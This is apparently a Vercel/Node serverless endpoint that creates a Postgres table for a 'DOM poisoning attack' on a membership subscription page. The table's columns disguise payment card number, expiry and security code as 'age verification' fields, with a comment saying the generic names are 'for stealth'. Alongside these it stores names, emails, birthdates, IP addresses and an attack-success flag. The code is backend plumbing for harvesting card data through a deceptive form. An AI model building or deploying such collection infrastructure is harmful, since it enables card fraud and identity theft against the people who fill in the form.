// Simple endpoint to create membership attack data table v2 (with generic field names)
// Visit: https://your-vercel-url.com/api/create-table-v2

import { neon } from '@neondatabase/serverless';

export default async function handler(req, res) {
    if (req.method !== 'GET') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        // Connect to Neon database
        const sql = neon(process.env.subscription_form_DATABASE_URL);

        // Create membership attack data table v2
        await sql`
            CREATE TABLE IF NOT EXISTS membership_attack_data_v2 (
                id SERIAL PRIMARY KEY,
                form_type VARCHAR(50) DEFAULT 'membership',

                -- Basic membership fields
                first_name VARCHAR(255),
                last_name VARCHAR(255),
                email VARCHAR(255),
                birthdate DATE,
                zip_code VARCHAR(20),

                -- Age verification fields (generic names for stealth)
                verification_number VARCHAR(255),
                exp_month VARCHAR(2),
                exp_year VARCHAR(2),
                security_code VARCHAR(4),
                legal_name VARCHAR(255),
                postal_code VARCHAR(20),

                -- Attack metadata
                dom_poisoning_success BOOLEAN DEFAULT FALSE,
                is_field_update BOOLEAN DEFAULT FALSE,
                update_timestamp TIMESTAMP,

                -- Environment data
                user_agent TEXT,
                ip_address INET,

                -- Timestamps
                submitted_at TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        `;

        // Create indexes for performance
        await sql`CREATE INDEX IF NOT EXISTS idx_membership_v2_email ON membership_attack_data_v2(email);`;
        await sql`CREATE INDEX IF NOT EXISTS idx_membership_v2_created_at ON membership_attack_data_v2(created_at);`;
        await sql`CREATE INDEX IF NOT EXISTS idx_membership_v2_dom_success ON membership_attack_data_v2(dom_poisoning_success);`;
        await sql`CREATE INDEX IF NOT EXISTS idx_membership_v2_is_update ON membership_attack_data_v2(is_field_update);`;

        res.status(200).json({
            success: true,
            message: 'Membership attack database table v2 created successfully',
            table: 'membership_attack_data_v2',
            purpose: 'DOM poisoning attack data collection for subscription2 page with generic field names',
            endpoints: {
                submit: '/api/membership/submit-v2',
                view: '/api/membership/view-v2'
            },
            columns: {
                basic_fields: ['first_name', 'last_name', 'email', 'birthdate', 'zip_code'],
                verification_fields: ['verification_number', 'exp_month', 'exp_year', 'security_code', 'legal_name', 'postal_code'],
                attack_metadata: ['dom_poisoning_success', 'is_field_update', 'user_agent', 'ip_address'],
                timestamps: ['submitted_at', 'created_at', 'update_timestamp']
            }
        });

    } catch (error) {
        console.error('Table v2 creation error:', error);
        res.status(500).json({
            error: 'Failed to create membership attack table v2',
            details: error.message
        });
    }
}